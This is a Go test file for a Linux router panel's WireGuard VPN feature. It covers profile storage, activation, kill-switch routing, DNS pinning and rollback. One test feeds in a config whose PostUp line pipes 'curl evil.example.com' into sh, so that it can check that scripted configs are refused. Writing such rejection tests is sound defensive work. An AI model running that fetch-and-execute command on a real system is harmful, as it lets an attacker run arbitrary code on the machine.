package usecase

import (
	"context"
	"encoding/json"
	"errors"
	"net/netip"
	"strings"
	"testing"
	"time"

	"github.com/nasnet-community/nasnet-panel-linux/internal/network/domain"
	"github.com/nasnet-community/nasnet-panel-linux/internal/network/system"
	"github.com/nasnet-community/nasnet-panel-linux/pkg/netmark"
	"github.com/nasnet-community/nasnet-panel-linux/pkg/nft"
)

const (
	tPriv = "iNb2CSuC4vfa1UAvOoNGeI9DoLR1s1zCVEfmzHnAHFE="
	tPub  = "Ntq1x3JYRTMHTIfNMpkKCPMBHfJhFtjM2sM82nz0ZW4="
)

// fakeVPNRepo is an in-memory VPNRepository. Real enough for the invariant that
// matters here: exactly one profile is active.
type fakeVPNRepo struct {
	rows   []domain.VPNProfile
	nextID uint
	err    error
}

func (f *fakeVPNRepo) List(context.Context) ([]domain.VPNProfile, error) {
	return f.rows, f.err
}

func (f *fakeVPNRepo) Get(_ context.Context, id uint) (*domain.VPNProfile, error) {
	for i := range f.rows {
		if f.rows[i].ID == id {
			c := f.rows[i]
			return &c, nil
		}
	}
	return nil, errors.New("no such profile")
}

func (f *fakeVPNRepo) Create(_ context.Context, p *domain.VPNProfile) error {
	f.nextID++
	p.ID = f.nextID
	p.Active = false
	f.rows = append(f.rows, *p)
	return nil
}

func (f *fakeVPNRepo) Update(_ context.Context, p *domain.VPNProfile) error {
	for i := range f.rows {
		if f.rows[i].ID == p.ID {
			f.rows[i].Name, f.rows[i].Config = p.Name, p.Config
			return nil
		}
	}
	return errors.New("no such profile")
}

func (f *fakeVPNRepo) Delete(_ context.Context, id uint) error {
	for i := range f.rows {
		if f.rows[i].ID != id {
			continue
		}
		if f.rows[i].Active {
			return domain.ErrProfileActive
		}
		f.rows = append(f.rows[:i], f.rows[i+1:]...)
		return nil
	}
	return errors.New("no such profile")
}

func (f *fakeVPNRepo) Active(context.Context) (*domain.VPNProfile, error) {
	if f.err != nil {
		return nil, f.err
	}
	for i := range f.rows {
		if f.rows[i].Active {
			c := f.rows[i]
			return &c, nil
		}
	}
	return nil, nil
}

func (f *fakeVPNRepo) SetActive(_ context.Context, id uint) error {
	found := false
	for i := range f.rows {
		f.rows[i].Active = f.rows[i].ID == id
		if f.rows[i].ID == id {
			found = true
		}
	}
	if !found {
		return errors.New("no such profile")
	}
	return nil
}

func (f *fakeVPNRepo) ClearActive(context.Context) error {
	for i := range f.rows {
		f.rows[i].Active = false
	}
	return nil
}

// fakeDoH answers with a fixed address, or refuses.
type fakeDoH struct {
	addr  string
	err   error
	calls int
}

func (f *fakeDoH) Resolve(context.Context, string) (netip.Addr, error) {
	f.calls++
	if f.err != nil {
		return netip.Addr{}, f.err
	}
	return netip.MustParseAddr(f.addr), nil
}

func wgConfigJSON(t *testing.T, mutate func(*domain.WireGuardConfig)) string {
	t.Helper()
	cfg := domain.WireGuardConfig{
		PrivateKey: tPriv,
		Address:    "10.66.0.2/32",
		Peer: domain.WGPeerConfig{
			PublicKey:  tPub,
			AllowedIPs: []string{"0.0.0.0/0"},
			Endpoint:   "vpn.example.com:51820",
		},
	}
	if mutate != nil {
		mutate(&cfg)
	}
	b, err := json.Marshal(cfg)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// stubGroupRepo is enough for Reconcile to run: the routing-rule shapes are
// proved in rules_test, not here.
type stubGroupRepo struct{ groups []domain.WANGroup }

func (s *stubGroupRepo) List(context.Context) ([]domain.WANGroup, error) { return s.groups, nil }
func (s *stubGroupRepo) GetByName(context.Context, string) (*domain.WANGroup, error) {
	return nil, nil
}
func (s *stubGroupRepo) Members(context.Context, uint) ([]domain.WANGroupMember, error) {
	return nil, nil
}
func (s *stubGroupRepo) EnsureDefaults(context.Context) error { return nil }
func (s *stubGroupRepo) SetMember(context.Context, uint, uint, int, uint32) error {
	return nil
}

type vpnFixture struct {
	uc   *networkUsecase
	repo *fakeVPNRepo
	wg   *system.FakeWGDevice
	doh  *fakeDoH
	be   *system.FakeBackend
	nft  *nft.Manager
}

func newVPNFixture(t *testing.T) *vpnFixture {
	t.Helper()
	f := &vpnFixture{
		repo: &fakeVPNRepo{},
		wg:   &system.FakeWGDevice{},
		doh:  &fakeDoH{addr: "185.65.135.1"},
		be:   system.NewFakeBackend(),
		nft:  nft.NewManager(&nft.FakeApplier{}),
	}
	f.uc = &networkUsecase{Deps: Deps{
		VPNRepo:    f.repo,
		WG:         f.wg,
		DoH:        f.doh,
		Backend:    f.be,
		Nft:        f.nft,
		IfRepo:     &stubIfRepo{},
		GroupRepo:  &stubGroupRepo{},
		RouterMode: true,
	}}
	return f
}

// One bad row used to empty the whole tab, bad row included.
func TestListVPNProfiles_OneBadRowDoesNotHideTheOthers(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "broken", Type: domain.VPNTypeWireGuard, Config: "not json"},
		{ID: 2, Name: "frankfurt", Type: domain.VPNTypeWireGuard,
			Config: `{"private_key":"` + tPriv + `","address":"10.66.0.2/32",` +
				`"peer":{"public_key":"` + tPub + `","endpoint":"1.2.3.4:51820","allowed_ips":["0.0.0.0/0"]}}`},
	}

	got, err := f.uc.ListVPNProfiles(context.Background())
	if err != nil {
		t.Fatalf("one unreadable row failed the whole list: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("got %d profiles, want both listed", len(got))
	}
	if got[0].Unreadable == "" {
		t.Error("the unreadable row is not marked, so the UI cannot explain it")
	}
	if got[1].Unreadable != "" || got[1].Config.Peer.Endpoint != "1.2.3.4:51820" {
		t.Errorf("the good row came back wrong: %+v", got[1])
	}
}

func TestCreateVPNProfile_FromAPastedURI(t *testing.T) {
	f := newVPNFixture(t)
	raw := "wireguard://" + strings.ReplaceAll(tPriv, "/", "%2F") + "@1.2.3.4:51820" +
		"?publickey=" + strings.ReplaceAll(tPub, "/", "%2F") + "&address=10.66.0.2/32#Berlin"

	v, err := f.uc.CreateVPNProfile(context.Background(), CreateVPNProfileRequest{Raw: raw})
	if err != nil {
		t.Fatal(err)
	}
	// The fragment names it, so pasting is the whole interaction.
	if v.Name != "Berlin" {
		t.Errorf("name = %q", v.Name)
	}
	if v.Config.PrivateKey != tPriv {
		t.Errorf("private key = %q", v.Config.PrivateKey)
	}
	// The public half is derived so the operator can paste it into their server.
	if v.PublicKey == "" {
		t.Error("no derived public key")
	}
	if v.Active {
		t.Error("creating a profile activated it")
	}
}

func TestCreateVPNProfile_RefusesAScriptedConfig(t *testing.T) {
	f := newVPNFixture(t)
	conf := "[Interface]\nPrivateKey = " + tPriv + "\nAddress = 10.66.0.2/32\n" +
		"PostUp = curl evil.example.com | sh\n\n[Peer]\nPublicKey = " + tPub +
		"\nEndpoint = 1.2.3.4:51820\n"

	_, err := f.uc.CreateVPNProfile(context.Background(), CreateVPNProfileRequest{Name: "x", Raw: conf})
	if !errors.Is(err, domain.ErrScriptKey) {
		t.Fatalf("err = %v, want ErrScriptKey", err)
	}
	if len(f.repo.rows) != 0 {
		t.Error("a rejected config was stored anyway")
	}
}

func TestActivateVPN_BringsTheTunnelUpAndRoutesIntoIt(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = &system.Applier{Snap: newTestSnapshotter(t, f.uc.Paths), Repo: &stubApplyRepo{},
		Paths: f.uc.Paths, Reload: func(context.Context) error { return nil }, Now: time.Now}
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Config: wgConfigJSON(t, nil)}}

	verdicts, view, err := f.uc.ActivateVPN(ctx, 1)
	if err != nil {
		t.Fatal(err)
	}
	if domain.Rejected(verdicts) {
		t.Fatalf("rejected: %+v", verdicts)
	}
	if view == nil {
		t.Fatal("no apply view, so nothing armed the auto-revert")
	}

	if f.wg.Applied == nil {
		t.Fatal("the tunnel interface was never configured")
	}
	// The pin is what keeps WireGuard's own handshakes off the domestic line.
	if f.wg.Applied.FirewallMark != netmark.PinMark(2) {
		t.Errorf("firewall mark = 0x%08x, want the secondary pin", f.wg.Applied.FirewallMark)
	}
	// A silent config still has to survive CGNAT.
	if f.wg.Applied.MTU != domain.DefaultWGMTU {
		t.Errorf("MTU = %d, want the default", f.wg.Applied.MTU)
	}
	if f.wg.Applied.Keepalive != time.Duration(domain.DefaultWGKeepalive)*time.Second {
		t.Errorf("keepalive = %v, want the default", f.wg.Applied.Keepalive)
	}
	// Resolved once, at activation, because the resolver is about to move inside.
	if f.wg.Applied.Endpoint.String() != "185.65.135.1:51820" {
		t.Errorf("endpoint = %v, want the resolved address", f.wg.Applied.Endpoint)
	}

	stored, _ := f.repo.Get(ctx, 1)
	var cfg domain.WireGuardConfig
	if err := json.Unmarshal([]byte(stored.Config), &cfg); err != nil {
		t.Fatal(err)
	}
	if cfg.PinnedEndpointIP != "185.65.135.1" {
		t.Errorf("pinned endpoint = %q, so the tunnel could not come up without a resolver", cfg.PinnedEndpointIP)
	}
}

// The whole feature, stated once: an unresolvable endpoint changes nothing.
func TestActivateVPN_UnresolvableEndpointRejectsAndAppliesNothing(t *testing.T) {
	f := newVPNFixture(t)
	f.doh.err = errors.New("no answer")
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Config: wgConfigJSON(t, nil)}}

	verdicts, view, err := f.uc.ActivateVPN(context.Background(), 1)
	if err != nil {
		t.Fatal(err)
	}
	if !domain.Rejected(verdicts) {
		t.Fatalf("verdicts = %+v, want a reject", verdicts)
	}
	if view != nil {
		t.Error("something was applied despite the reject")
	}
	if f.wg.Applied != nil {
		t.Error("the tunnel came up despite the reject")
	}
	if f.repo.rows[0].Active {
		t.Error("the profile was activated despite the reject")
	}
}

func TestActivateVPN_NarrowAllowedIPsWarnsButApplies(t *testing.T) {
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = &system.Applier{Snap: newTestSnapshotter(t, f.uc.Paths), Repo: &stubApplyRepo{},
		Paths: f.uc.Paths, Reload: func(context.Context) error { return nil }, Now: time.Now}
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "split", Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
		c.Peer.AllowedIPs = []string{"10.0.0.0/8"}
	})}}

	verdicts, view, err := f.uc.ActivateVPN(context.Background(), 1)
	if err != nil {
		t.Fatal(err)
	}
	if domain.Rejected(verdicts) {
		t.Fatalf("rejected a legal split tunnel: %+v", verdicts)
	}
	if !hasVerdict(verdicts, "V32") {
		t.Errorf("no warning that the rest of the traffic will drop: %+v", verdicts)
	}
	if view == nil {
		t.Error("the change was not applied")
	}
}

// Provisioning before the dish arrives is a real workflow.
func TestActivateVPN_NoSecondaryUplinkWarnsButApplies(t *testing.T) {
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = &system.Applier{Snap: newTestSnapshotter(t, f.uc.Paths), Repo: &stubApplyRepo{},
		Paths: f.uc.Paths, Reload: func(context.Context) error { return nil }, Now: time.Now}
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Config: wgConfigJSON(t, nil)}}

	verdicts, view, err := f.uc.ActivateVPN(context.Background(), 1)
	if err != nil {
		t.Fatal(err)
	}
	if !hasVerdict(verdicts, "V33") {
		t.Errorf("no warning about the missing uplink: %+v", verdicts)
	}
	if domain.Rejected(verdicts) || view == nil {
		t.Error("refused to pre-provision")
	}
}

func TestDeactivateVPN_TakesTheTunnelDown(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = &system.Applier{Snap: newTestSnapshotter(t, f.uc.Paths), Repo: &stubApplyRepo{},
		Paths: f.uc.Paths, Reload: func(context.Context) error { return nil }, Now: time.Now}
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true, Config: wgConfigJSON(t, nil)}}
	if err := f.uc.applyVPNDevice(ctx); err != nil {
		t.Fatal(err)
	}

	if _, _, err := f.uc.DeactivateVPN(ctx); err != nil {
		t.Fatal(err)
	}
	if f.repo.rows[0].Active {
		t.Error("the profile is still active")
	}
	if f.wg.Deleted == 0 {
		t.Error("the tunnel interface survived deactivation")
	}
}

func TestDeleteVPNProfile_RefusedWhileActive(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true, Config: wgConfigJSON(t, nil)}}
	if err := f.uc.DeleteVPNProfile(context.Background(), 1); !errors.Is(err, domain.ErrProfileActive) {
		t.Errorf("err = %v, want ErrProfileActive", err)
	}
}

func TestUpdateVPNProfile_RefusedWhileActive(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true, Config: wgConfigJSON(t, nil)}}
	_, err := f.uc.UpdateVPNProfile(context.Background(), 1,
		CreateVPNProfileRequest{Name: "x", Config: &domain.WireGuardConfig{}})
	if !errors.Is(err, ErrValidationFailed) {
		t.Errorf("err = %v, want a validation failure", err)
	}
}

// A tunnel is up or it is not, and the only evidence either way is a handshake.
func TestVPNStatus_HandshakeAgeDecidesConnected(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true, Config: wgConfigJSON(t, nil)}}
	if err := f.uc.applyVPNDevice(ctx); err != nil {
		t.Fatal(err)
	}

	f.wg.Stat = &system.WGStatus{LastHandshake: time.Now().Add(-30 * time.Second), RxBytes: 10, TxBytes: 20}
	st, err := f.uc.VPNStatus(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if !st.Connected || st.RxBytes != 10 || st.TxBytes != 20 {
		t.Errorf("status = %+v", st)
	}
	if st.HandshakeAgeSecs == nil || *st.HandshakeAgeSecs < 25 {
		t.Errorf("handshake age = %v", st.HandshakeAgeSecs)
	}
	if !st.KillSwitch {
		t.Error("the kill switch is reported as off; it is not a setting")
	}
	// Defaults have to be reported as applied, or the UI shows a blank MTU.
	if st.MTU != domain.DefaultWGMTU || st.KeepaliveSecs != domain.DefaultWGKeepalive {
		t.Errorf("mtu = %d keepalive = %d", st.MTU, st.KeepaliveSecs)
	}

	f.wg.Stat = &system.WGStatus{LastHandshake: time.Now().Add(-system.StaleHandshakeAfter - time.Second)}
	st, err = f.uc.VPNStatus(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if st.Connected {
		t.Error("a tunnel with a stale handshake reported as connected")
	}
}

func TestVPNStatus_NoProfileIsNotAnError(t *testing.T) {
	st, err := newVPNFixture(t).uc.VPNStatus(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if st.ActiveProfileID != nil || st.Connected {
		t.Errorf("status = %+v", st)
	}
	if !st.KillSwitch {
		t.Error("with no profile the kill switch is exactly what is holding")
	}
}

// The tunnel does not survive a reboot, so boot has to put it back.
func TestApplyVPNDevice_RebuildsFromTheStoredProfile(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true,
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })}}

	if err := f.uc.applyVPNDevice(ctx); err != nil {
		t.Fatal(err)
	}
	if f.wg.Applied == nil {
		t.Fatal("the tunnel was not rebuilt")
	}
	// Straight from the pin: at boot there may be no resolver at all yet.
	if f.doh.calls != 0 {
		t.Errorf("boot made %d DNS lookups; the pinned address is there so it needs none", f.doh.calls)
	}
}

// A failed read used to pass for a clean teardown.
func TestApplyVPNRoutes_AFailedReadIsNotAnEmptyTable(t *testing.T) {
	f := newVPNFixture(t)
	f.be.Err = errors.New("netlink is busy")

	err := f.uc.applyVPNRoutes(context.Background(), vpnPlane{}, twoUplinks())
	if err == nil {
		t.Fatal("a failed routing-table read was reported as a successful teardown")
	}
}

// An unreadable config must read as "no tunnel", which blackholes, rather than
// as "no kill switch", which leaks.
func TestVPNRouteState_FailsTowardsTheBlackhole(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Active: true, Config: "not json"}}
	if f.uc.vpnRouteState(context.Background()).Active {
		t.Error("an unreadable profile still routed traffic into a tunnel that cannot exist")
	}

	f.repo.err = errors.New("database is gone")
	if f.uc.vpnRouteState(context.Background()).Active {
		t.Error("a database failure was read as a working tunnel")
	}
}

func TestVPNForeignDNS_FollowsTheProfileThenTheDefault(t *testing.T) {
	// The provider's own resolver is the one guaranteed to answer inside their
	// tunnel, so it wins when they name one.
	plane := vpnPlane{
		Profile: &domain.VPNProfile{ID: 1},
		Config:  &domain.WireGuardConfig{DNS: "10.64.0.1"},
	}
	if got := vpnForeignDNS(plane); got.Server != "10.64.0.1" || got.IfName != system.WGLinkName {
		t.Errorf("got %+v", got)
	}

	plane.Config = &domain.WireGuardConfig{}
	if got := vpnForeignDNS(plane); got.Server != DefaultForeignDNS || got.IfName != system.WGLinkName {
		t.Errorf("got %+v", got)
	}

	// With no tunnel there is nowhere honest to send a foreign query: a
	// plaintext one out the raw uplink is the leak this feature exists to stop.
	if got := vpnForeignDNS(vpnPlane{}); got.Server != "" || got.IfName != "" {
		t.Errorf("got %+v, want nothing", got)
	}
}

func TestVPNRoutes_DefaultIntoTheTunnelAndTheDishStaysReachable(t *testing.T) {
	routes := vpnRoutes(twoUplinks())

	var haveDefault, haveDish bool
	for _, r := range routes {
		if r.Table != system.WGTable {
			t.Errorf("route %+v is in the wrong table", r)
		}
		if r.Dest == "default" && r.OifName == system.WGLinkName {
			haveDefault = true
		}
		if r.Dest == StarlinkDishSubnet && r.OifName == "enp2s0" && r.Scope == "link" {
			haveDish = true
		}
	}
	if !haveDefault {
		t.Error("no default route into the tunnel")
	}
	if !haveDish {
		t.Error("the dish's own address became unreachable")
	}
}

// A stale default pointing at a device that is gone is worse than an empty
// table: it is a black hole that looks like a route.
func TestApplyVPNRoutes_ClearsTheTableWhenNoTunnelIsUp(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	for _, r := range vpnRoutes(twoUplinks()) {
		if err := f.be.RouteReplace(ctx, r); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.uc.applyVPNRoutes(ctx, vpnPlane{}, twoUplinks()); err != nil {
		t.Fatal(err)
	}
	left, err := f.be.RouteList(ctx, system.WGTable)
	if err != nil {
		t.Fatal(err)
	}
	if len(left) != 0 {
		t.Errorf("routes survived the tunnel: %+v", left)
	}
}

func TestApplyKillSwitchState_ArmsOnTheSecondaryUplink(t *testing.T) {
	ctx := context.Background()
	m := nft.NewManager(&nft.FakeApplier{})
	if err := ApplyKillSwitchState(ctx, m, twoUplinks(), "100.64.0.1"); err != nil {
		t.Fatal(err)
	}
	k := m.Snapshot().KillSwitch
	if k == nil {
		t.Fatal("no kill switch")
	}
	if k.SecondaryIfName != "enp2s0" || k.GatewayIP != "100.64.0.1" {
		t.Errorf("kill switch = %+v", k)
	}
	if k.MarkValue != netmark.PinMark(2) || k.MarkMask != netmark.MaskPin {
		t.Errorf("mark = 0x%08x/0x%08x, want the secondary pin", k.MarkValue, k.MarkMask)
	}
	if len(k.BootstrapIPs) == 0 {
		t.Error("no bootstrap addresses, so an endpoint hostname could never resolve")
	}
}

// It is not a VPN setting: it exists because the uplink does.
func TestApplyKillSwitchState_ArmedWithNoTunnelConfigured(t *testing.T) {
	ctx := context.Background()
	m := nft.NewManager(&nft.FakeApplier{})
	if err := ApplyKillSwitchState(ctx, m, twoUplinks(), ""); err != nil {
		t.Fatal(err)
	}
	if m.Snapshot().KillSwitch == nil {
		t.Fatal("no kill switch with no VPN configured; the uplink would carry traffic in the clear")
	}

	// With no secondary uplink there is nothing to guard.
	if err := ApplyKillSwitchState(ctx, m, twoUplinks()[:1], ""); err != nil {
		t.Fatal(err)
	}
	if m.Snapshot().KillSwitch != nil {
		t.Error("a kill switch on a box with no secondary uplink")
	}
}

func TestLANEgressNames_NeverIncludesTheSecondaryUplink(t *testing.T) {
	for _, vpn := range []VPNRouteState{{Active: false}, {Active: true}} {
		names := lanEgressNames(twoUplinks(), vpn)
		for _, n := range names {
			if n == "enp2s0" {
				t.Errorf("vpn active=%v: the LAN can still leave by the raw uplink: %v",
					vpn.Active, names)
			}
		}
		if vpn.Active && (len(names) != 2 || names[1] != system.WGLinkName) {
			t.Errorf("names = %v, want the domestic uplink and the tunnel", names)
		}
	}
}

func TestWGApplyConfig_UsesThePinnedEndpointAndItsOwnPort(t *testing.T) {
	cfg := &domain.WireGuardConfig{
		PrivateKey: tPriv, Address: "10.66.0.2/32",
		MTU: 1380,
		Peer: domain.WGPeerConfig{
			PublicKey: tPub, AllowedIPs: []string{"0.0.0.0/0"},
			Endpoint: "vpn.example.com:51820", PersistentKeepalive: 15,
		},
		PinnedEndpointIP: "185.65.135.1",
		DNS:              "10.64.0.1",
	}
	got, err := wgApplyConfig(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if got.Endpoint.String() != "185.65.135.1:51820" {
		t.Errorf("endpoint = %v", got.Endpoint)
	}
	if got.MTU != 1380 || got.Keepalive != 15*time.Second {
		t.Errorf("mtu = %d keepalive = %v; explicit values must not be overwritten", got.MTU, got.Keepalive)
	}
	if got.DNS.String() != "10.64.0.1" {
		t.Errorf("dns = %v", got.DNS)
	}
	if len(got.AllowedIPs) != 1 || got.AllowedIPs[0].String() != "0.0.0.0/0" {
		t.Errorf("allowed ips = %v", got.AllowedIPs)
	}
}

// A rollback that cannot take the tunnel down leaves routes pointing into it.
func TestRestoreVPN_TearsDownWhenNoneWasActive(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true, Config: wgConfigJSON(t, nil)}}
	if err := f.uc.applyVPNDevice(ctx); err != nil {
		t.Fatal(err)
	}

	if err := f.uc.restoreVPN(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if f.repo.rows[0].Active {
		t.Error("the profile is still active after a revert")
	}
	if f.wg.Deleted == 0 {
		t.Error("the tunnel interface survived the revert")
	}
}

func TestRestoreVPN_PutsThePreviousTunnelBack(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	// A profile that was ever active carries its pinned address, which is what
	// makes the revert independent of any resolver.
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin",
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })}}

	prev := f.repo.rows[0]
	prev.Active = true
	if err := f.uc.restoreVPN(ctx, &prev); err != nil {
		t.Fatal(err)
	}
	if !f.repo.rows[0].Active {
		t.Error("the previous profile was not reactivated")
	}
	if f.wg.Applied == nil {
		t.Error("the tunnel was not brought back up")
	}
	// The dead-man runs out of process while the network is broken; a revert
	// that needed DNS would be a revert that could not run.
	if f.doh.calls != 0 {
		t.Errorf("the revert made %d DNS lookups", f.doh.calls)
	}
}

// Providers move endpoints. A tunnel that has gone quiet looks the same either
// way, so the only way to tell is to ask again.
func TestCheckVPNHealth_ReresolvesASilentTunnel(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true,
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "1.2.3.4" })}}
	if err := f.uc.applyVPNDevice(ctx); err != nil {
		t.Fatal(err)
	}
	f.wg.Stat = &system.WGStatus{} // never handshook

	f.uc.checkVPNHealth(ctx)
	if f.wg.Endpoint.Addr().String() != "185.65.135.1" {
		t.Errorf("endpoint = %v, want the freshly resolved address", f.wg.Endpoint)
	}
	stored, _ := f.repo.Get(ctx, 1)
	if !strings.Contains(stored.Config, "185.65.135.1") {
		t.Error("the new address was not persisted, so a reboot would use the stale one")
	}

	// And it must not do that on every tick: each one is a request out the raw
	// uplink.
	before := f.doh.calls
	f.uc.checkVPNHealth(ctx)
	if f.doh.calls != before {
		t.Errorf("re-resolved again immediately: %d calls", f.doh.calls)
	}
}

// An address endpoint cannot have moved, so asking is pure noise.
func TestCheckVPNHealth_NeverReresolvesAnAddressEndpoint(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Active: true,
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
			c.Peer.Endpoint = "185.65.135.1:51820"
		})}}
	if err := f.uc.applyVPNDevice(ctx); err != nil {
		t.Fatal(err)
	}
	f.wg.Stat = &system.WGStatus{}

	f.uc.checkVPNHealth(ctx)
	if f.doh.calls != 0 {
		t.Errorf("looked up an address %d times", f.doh.calls)
	}
}

func hasVerdict(vs []domain.Verdict, rule string) bool {
	for _, v := range vs {
		if v.Rule == rule {
			return true
		}
	}
	return false
}
